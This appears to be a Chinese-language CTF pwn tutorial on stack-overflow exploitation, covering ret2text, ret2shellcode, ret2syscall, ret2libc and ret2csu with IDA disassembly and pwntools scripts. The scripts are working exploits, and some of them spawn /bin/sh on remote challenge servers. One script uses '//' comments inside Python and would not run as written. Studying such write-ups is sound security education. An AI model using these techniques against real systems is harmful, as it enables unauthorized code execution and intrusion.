---
title: Stack Overflow
date: 2023-10-31T17:02:51+08:00
tags: [CTF, Pwn]
---

## ret2text

如果程序没有开启 canary 和 PIE 保护，那么可以通过 ret2text 来控制程序流。

一般是题目提供了一些后门函数和溢出漏洞，那么我们可以通过 ida 查看后门函数的地址，并将其覆盖到当前函数的 ret 地址，使程序跳转到后门函数。

**SSSCTF 2024 man_gets**

下面的程序没有开启 canary 和 PIE 保护，并且存在 gets 溢出漏洞。

```c
int __cdecl main(int argc, const char **argv, const char **envp)
{
  char v4[32]; // [rsp+0h] [rbp-20h] BYREF

  setbuf(stdin, 0LL);
  setbuf(stdout, 0LL);
  setbuf(stderr, 0LL);
  puts("It is a baby stack overflow without protection!!!!!\nI can work this out easily");
  puts("Type 'man gets' on your linux termimal.\nWhat do you find?");
  gets(v4);
  return 0;
}
```

可以发现，程序中存在 can_can_need 后门函数：

```assembly
.text:0000000000401214                 public can_can_need
.text:0000000000401214 can_can_need    proc near
.text:0000000000401214 ; __unwind {
.text:0000000000401214                 endbr64
.text:0000000000401218                 push    rbp
.text:0000000000401219                 mov     rbp, rsp
.text:000000000040121C                 lea     rax, command    ; "/bin/sh"
.text:0000000000401223                 mov     rdi, rax        ; command
.text:0000000000401226                 call    _system
.text:000000000040122B                 nop
.text:000000000040122C                 pop     rbp
.text:000000000040122D                 retn
.text:000000000040122D ; } // starts at 401214
.text:000000000040122D can_can_need    endp
.text:000000000040122D
.text:000000000040122D _text           ends
.text:000000000040122D
```

因此，我们可以构造 payload 覆盖掉 ret 地址，使其跳转到后门函数：

```python
from pwn import *

conn = pwn.remote("210.30.97.133", 10012)
conn.recvuntil(b"?\n")
conn.sendline(b"a" * 0x28 + p64(0x40121C))
conn.interactive()
```

其中，前面需要填充 `0x20 + 0x8` 个字节，因为 `v4[32]` 的位置在 `rbp-20h` 的位置，我们覆盖到 rbp 后，还要再填充一次栈的宽度（64 位机器是 8 字节，32 位机器是 4 字节）来覆盖掉 rbp，之后才是真正的 ret 地址所在的位置。

## ret2shellcode

如果程序没有开启 NX 保护（可写不可执行，可执行不可写），那么我们可以通过向栈中写入恶意代码，然后控制程序流执行到我们的恶意代码来得到权限。

**0xGame 2023 shellcode-any**

```c
int __cdecl main(int argc, const char **argv, const char **envp)
{
  unsigned int v3; // eax
  char *buf; // [rsp+8h] [rbp-8h]
  void (*bufa)(void); // [rsp+8h] [rbp-8h]

  bufinit(argc, argv, envp);
  buf = (char *)mmap((void *)0x20230000, 0x1000uLL, 7, 34, -1, 0LL);
  puts("Now show me your code:");
  read(0, buf, 0x100uLL);
  puts("Implementing security mechanism...");
  v3 = time(0LL);
  srand(v3);
  bufa = (void (*)(void))&buf[rand() % 256];
  close(1);
  puts("Done!");
  bufa();
  return 0;
}
```

可以看到，我们可以向栈中写入程序片段，并且程序会随机执行 buf 中的一条命令，可以把 buf 的前面都填充 `nop` 指令（空指令，0x90，什么都不做，并继续执行接下来的命令），将 shellcode 放在 buf 的末尾来增加成功执行的概率。

```python
from pwn import *

context(os="linux", arch="amd64")

conn = remote("8.130.35.16", 51003)
conn.recvuntil("code:\n")
conn.sendline(asm(shellcraft.sh()).rjust(0x100, b"\x90"))
conn.interactive()
```

pwntools 为我们提供了预先写好了各种 shellcode 的 shellcraft 模块，和用于编译 shellcode 的 asm 函数。这里，我们使用了 rjust 函数，它可以将我们的字符串对齐到指定的宽度，并填充指定的字符串用于对齐。

## ret2syscall

有时候，如果程序中没有后门函数，我们可以手动通过各种 gadgets 拼接出自己想要的代码来得到权限。而在 syscall 中有许多诸如 execve 之类的函数可以让我们执行任意代码。

在进行 syscall 的时候，我们需要设置 rax 寄存器的值来指定要执行的系统调用号。其中，execve 对应的系统调用号是 0x3B。

**0xGame 2023 ret2syscall**

```c
int __cdecl main(int argc, const char **argv, const char **envp)
{
  char v4[16]; // [rsp+0h] [rbp-10h] BYREF

  bufinit(argc, argv, envp);
  puts("I leave something interesting in this program.");
  puts("Now try to find them out!");
  puts("Input: ");
  gets(v4);
  return 0;
}
```

程序提到了这里藏有一些有趣的东西，我们可以发现程序贴心地为我们提供了许多有用的 gadgets：

**set_rax**

```assembly
.text:0000000000401196                 endbr64
.text:000000000040119A                 push    rbp
.text:000000000040119B                 mov     rbp, rsp
.text:000000000040119E                 mov     [rbp-4], edi
.text:00000000004011A1                 mov     eax, [rbp-4]
.text:00000000004011A4                 pop     rbp
.text:00000000004011A5                 retn
```

这个函数会将 rax 的值设置成 edi 的值。

**gadget**

```assembly
.text:00000000004011AE                 syscall                 ; LINUX -
```

我们会遇到程序中没有 `/bin/sh`等我们想要的字段，这时我们可以再构造一些代码将这些数据写入到我们可控的位置。

```python
from pwn import *

context(arch="amd64", os="linux")

s = gdb.debug("./ret2syscall", "break main")
elf = ELF("./ret2syscall")

setrax = 0x401196
syscall = 0x4011AA
csu1 = 0x4012DA
csu2 = 0x4012C0
rdi = 0x4012E3            // pop rdi

bss = 0x404500            // bss段，可读可写
execve = 0x3B             // execve 的系统调用号

payload = flat([
    b"a" * 0x18,          // 覆盖到 retn 地址
    rdi, bss,             // 将 rdi 设置为 bss 起始地址
    elf.plt.gets,         // 执行 gets，将自定义数据写入 rdi 指向的值
    rdi, execve,          // 将 rdi 设置为 execve 的系统调用号
    setrax,               // 将 rax 的值设置为 rdi 指向的值

    //    rbx  rbp  r12  r13  r14  r15
    csu1, 0,   0,   bss, 0,   0,   bss+8,
    csu2
])

s.recvuntil("Input: ")
s.sendline(payload)
s.sendline(b"/bin/sh\0"+p64(syscall))
s.interactive()
```

在这里，pwntools 提供的 `ELF.plt` 函数非常有用，可以帮助我们寻找程序中出现过的函数的地址，使代码更容易理解。

## ret2libc

实际上，构造 ret2syscall 通常是十分繁琐复杂的。既然大部分程序都会使用 libc，那么我们完全可以直接利用 libc 中的 `system` 函数和 `/bin/sh` 字段。

因为 libc 开启了地址随机化，所以需要首先泄漏出 libc 的基址，然后通过对应版本的 libc 计算偏移来利用 libc 中的各种参数和函数。

```python
payload1 = flat([
    b'\0'*0x28,
    # 泄漏 got 表
    rdi, elf.got.read,
    elf.plt.puts,
    # 重新执行 main 函数以继续利用 read 函数
    elf.sym.main
])

```

`u64()` 接收一个 8 字节字符序列并解包为对应的地址。而地址的高位一定是 \0，例如 0x00007f706a508fc0，输出时会被 puts 截断。所以可以保证 `recvline()` 得到的字符序列去掉行尾 \n 后一定是 8 字节以内的。

最后使用 `ljust(8, b"\0"))` 向高位补齐 \0 即可得到的地址是真实的 read 地址，减去 read 在 libc 中的偏移量即可得到 libc 基址。

```python
libc.address = u64(io.recvline()[:-1].ljust(8, b"\0")) - libc.sym.read

payload2 = flat([
    b'\0'*0x28,
    # system 函数中有使用到 movups xmmword 相关汇编指令，需要对栈进行对齐
    # 这里 rdi + 1 是一个 retn 语句，根据 rop 链的特性，可以返回到自己
    # 从而让栈多了一字节，实现对齐操作（另见栈对齐）
    rdi + 1,
    # libc.search 搜索 elf 文件中的文本，返回的是一个迭代器
    # 使用 next() 得到第一个 /bin/sh 所在的地址
    rdi, next(libc.search(b'/bin/sh')),
    # 当设置了 libc.address 后，plt, got, sym 的地址均会自动更新
    libc.sym.system
])
```

## ret2csu

一般的程序都会使用到 libc，而 libc 的初始化函数 `__lib_csu_init` 中存储两个我们可以用于修改寄存器的 gadgets。

**gadgets1**

可以修改 rbx，rbp，r12，r13，r14，r15。

```assembly
.text:00000000004012D6 loc_4012D6:                             ; CODE XREF: __libc_csu_init+35↑j
.text:00000000004012D6                 add     rsp, 8
.text:00000000004012DA                 pop     rbx
.text:00000000004012DB                 pop     rbp
.text:00000000004012DC                 pop     r12
.text:00000000004012DE                 pop     r13
.text:00000000004012E0                 pop     r14
.text:00000000004012E2                 pop     r15
.text:00000000004012E4                 retn
```

其中，如果我们选择截断倒数第二行的 `pop r15`，也就是跳转到 0x4012E3，可以得到 `pop rdi; retn` 这样一个十分有用的 gadget。

**gadgets2**

配合 gadgets1，可以实现修改函数调用的前三个参数 rdx(r14)、rsi(r13) 和 edi(r12d) 的值，并执行 r15+rbx\*8 处的函数。

如果将 rbx 设置成 0，那么就是执行 r15 指向的函数。

```assembly
.text:00000000004012C0 loc_4012C0:                             ; CODE XREF: __libc_csu_init+54↓j
.text:00000000004012C0                 mov     rdx, r14
.text:00000000004012C3                 mov     rsi, r13
.text:00000000004012C6                 mov     edi, r12d
.text:00000000004012C9                 call    ds:(__frame_dummy_init_array_entry - 403E10h)[r15+rbx*8]
.text:00000000004012CD                 add     rbx, 1
.text:00000000004012D1                 cmp     rbp, rbx
.text:00000000004012D4                 jnz     short loc_4012C0
```
